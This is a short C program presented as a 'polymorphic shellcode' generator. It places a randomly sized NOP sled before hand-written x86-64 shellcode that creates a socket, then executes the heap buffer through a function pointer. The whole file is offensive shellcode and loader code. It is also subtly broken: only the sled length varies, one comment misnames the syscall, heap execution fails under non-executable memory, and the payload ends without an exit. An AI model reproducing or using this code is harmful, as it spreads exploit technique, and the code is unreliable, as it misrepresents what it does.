#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char *generate_polymorphic_shellcode() {
    srand(time(NULL));
    
    char *template = 
        "\x48\x31\xc0"              // xor rax, rax
        "\x48\x31\xff"              // xor rdi, rdi
        "\x48\x31\xf6"              // xor rsi, rsi
        "\x48\x31\xd2"              // xor rdx, rdx
        "\x48\x31\xc9"              // xor rcx, rcx
        "\x48\x31\xdb"              // xor rbx, rbx
        "\x6a\x29"                 // push 41 (socketcall)
        "\x58"                     // pop rax
        "\x6a\x02"                // push 2 (AF_INET)
        "\x5f"                    // pop rdi
        "\x6a\x01"               // push 1 (SOCK_STREAM)
        "\x5e"                  // pop rsi
        "\x0f\x05";            // syscall
    
    char *nop_sled = malloc(1024);
    int sled_size = rand() % 512 + 256;
    
    for(int i = 0; i < sled_size; i++) {
        nop_sled[i] = 0x90; // NOP
    }
    
    char *final = malloc(strlen(template) + sled_size + 1);
    memcpy(final, nop_sled, sled_size);
    memcpy(final + sled_size, template, strlen(template));
    final[strlen(template) + sled_size] = '\0';
    
    free(nop_sled);
    return final;
}

int main() {
    char *shellcode = generate_polymorphic_shellcode();
    
    void (*code)() = (void(*)())shellcode;
    code();
    
    free(shellcode);
    return 0;
}